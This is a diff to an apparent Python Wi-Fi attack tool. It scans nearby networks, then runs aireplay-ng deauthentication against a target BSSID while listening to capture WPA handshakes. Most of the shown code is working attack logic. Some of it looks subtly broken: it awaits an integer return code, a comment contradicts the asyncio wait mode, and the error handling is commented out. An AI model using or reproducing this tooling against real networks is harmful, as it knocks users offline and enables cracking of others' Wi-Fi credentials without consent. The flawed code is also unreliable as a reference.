@@ -83,43 +83,45 @@ def showInterfaces() -> json:
 	return interfacesJson
 
 
-# here we have to pass in helper obj bc of pussy parent package shit
 async def dumpAndStore(interfaceIDX: int = 0, helpersObj: object = None):
-	#try:
-	
-	# Scan for WLAN networks
+    # Scan for WLAN networks
     iface.scan()
     await asyncio.sleep(5)  # Sleep for 5 seconds before the next iteration
-	# Get the scan results
+
+    # Get the scan results
     scan_results = iface.scan_results()
-    # Create a list to store the scan result data
+    
+    # Create a list to store the scan result data along with channels
     scan_data = {}
+
     for result in scan_results:
         frequency = result.freq / 1000  # Convert frequency to MHz
         if 2400 <= frequency <= 2500:
             # 2.4 GHz band
-            channel = (frequency - 2400) / 5 + 1
+            channel = int((frequency - 2400) / 5 + 1)
             band = "2.4 GHz"
         elif 5000 <= frequency <= 6000:
             # 5 GHz band
-            channel = (frequency - 5000) / 5 + 36
+            channel = int((frequency - 5000) / 5 + 36)
             band = "5 GHz"
         else:
+            channel = "unknown"
             band = "Unknown"
 
-        scan_data[result.ssid] = {
+        scan_data[result.ssid]={
             "SSID": result.ssid,
             "Signal_Strength": result.signal,
             "BSSID": result.bssid.upper()[:-1],
             "akm": result.akm,
             "auth": result.auth,
             "freq": result.freq,
-            "channel": int(channel),
+            "channel": channel,  # Store the channel as an integer
             "band": band
         }
 
-
+    # Store the scan data in a database or perform other actions as needed
     await helpersObj.database().writeToDB("scanResults", scan_data)
+
 
 
 	#except Exception as e:
@@ -284,73 +286,73 @@ async def listenForHandshakes(interface: str, bssid: str, timeout: int = 15):
 
 
 async def deauthenticateNetwork(interface: str, bssid: str, timeout: int = 10, frames: int = 10):
+    #try:
+    print("deauthing network started")
+    # Define the aireplay-ng command for deauthentication
+    deauth_command = [
+        "sudo", "aireplay-ng", "--deauth", frames,  
+        "-a", bssid, interface
+    ]
+    
+    # Start the aireplay-ng process
+    deauth_process = await asyncio.create_subprocess_exec(
+        *deauth_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
+    )
+
+    # Wait for the process to complete or timeout
     try:
-        print("deauthing network started")
-        # Define the aireplay-ng command for deauthentication
-        deauth_command = [
-            "sudo", "aireplay-ng", "--deauth", frames,  
-            "-a", bssid, interface
-        ]
-        
-        # Start the aireplay-ng process
-        deauth_process = await asyncio.create_subprocess_exec(
-            *deauth_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
-        )
+        await asyncio.wait_for(deauth_process.wait(), timeout=timeout)
+    except asyncio.TimeoutError:
+        # Handle timeout
+        deauth_process.terminate()
+        return {"status": "error", "message": "Deauthentication timed out"}
 
-        # Wait for the process to complete or timeout
-        try:
-            await asyncio.wait_for(deauth_process.wait(), timeout=timeout)
-        except asyncio.TimeoutError:
-            # Handle timeout
-            deauth_process.terminate()
-            return {"status": "error", "message": "Deauthentication timed out"}
+    # Check the return code to see if the process was successful
+    return_code = await deauth_process.returncode
+    if return_code == 0:
+        return {"status": "success", "message": "Deauthentication sent successfully"}
+    else:
+        return {"status": "error", "message": "Deauthentication failed"}
 
-        # Check the return code to see if the process was successful
-        return_code = await deauth_process.returncode
-        if return_code == 0:
-            return {"status": "success", "message": "Deauthentication sent successfully"}
-        else:
-            return {"status": "error", "message": "Deauthentication failed"}
-
-    except subprocess.CalledProcessError as e:
-        return {"status": "error", "message": "Error running aireplay-ng", "error": str(e)}
-    except Exception as e:
-        return {"status": "error", "message": "An unexpected error occurred", "error": str(e)}
+    #except subprocess.CalledProcessError as e:
+    #    return {"status": "error", "message": "Error running aireplay-ng", "error": str(e)}
+    #except Exception as e:
+    #    return {"status": "error", "message": "An unexpected error occurred", "error": str(e)}
 
 
 # ok yes this part is chatgpt but hey this part was hard gimmie a break🤓
 async def captureHandshake(interface: str, bssid: str, timeout: int = 10):
-    try:
-        # YES it ends here, these are the last to sub calls to listen and capture the handshake hopefully lmao
-        
-        listening_task = asyncio.create_task(listenForHandshakes(interface, bssid))
-        deauth_task = asyncio.create_task(deauthenticateNetwork(interface, bssid, timeout))
+    #try:
+    # YES it ends here, these are the last to sub calls to listen and capture the handshake hopefully lmao
+    
+    listening_task = asyncio.create_task(listenForHandshakes(interface, bssid))
+    deauth_task = asyncio.create_task(deauthenticateNetwork(interface, bssid, timeout))
 
-        # Wait for either task to complete
-        done, _ = await asyncio.wait([listening_task, deauth_task], return_when=asyncio.FIRST_COMPLETED)
+    # Wait for either task to complete
+    done, _ = await asyncio.wait([listening_task, deauth_task], return_when=asyncio.ALL_COMPLETED)
 
-        # Cancel the other task
-        for task in done:
-            print("task done => ", task)
-            if task == listening_task:
-                deauth_task.cancel()
-            else:
-                listening_task.cancel()
+    # Cancel the other task
+    for task in done:
+        print("task done => ", task)
+        if task == listening_task:
+            deauth_task.cancel()
+        else:
+            listening_task.cancel()
 
-        # Determine which task completed
-        if listening_task.done() and listening_task.result():
-            return listening_task.result()
-        elif deauth_task.done() and deauth_task.result():
-            return deauth_task.result()
+    # Determine which task completed
+    if listening_task.done() and listening_task.result():
+        return listening_task.result()
+    elif deauth_task.done() and deauth_task.result():
+        return deauth_task.result()
 
-        return {"status": "error", "message": "Both tasks failed to complete"}
+    return {"status": "error", "message": "Both tasks failed to complete"}
 
-    except asyncio.CancelledError:
-        return {"status": "error", "message": "Task was cancelled"}
-    except subprocess.CalledProcessError as e:
-        return {"status": "error", "message": "Error running airodump-ng", "error": str(e)}
-    except Exception as e:
-        return {"status": "error", "message": "An unexpected error occurred", "error": str(e)}
+    #except asyncio.CancelledError:
+    #    return {"status": "error", "message": "Task was cancelled"}
+    #except subprocess.CalledProcessError as e:
+    #    return {"status": "error", "message": "Error running airodump-ng", "error": str(e)}
+    #except Exception as e:
+    #    return {"status": "error", "message": "An unexpected error occurred", "error": str(e)}
 
 
 
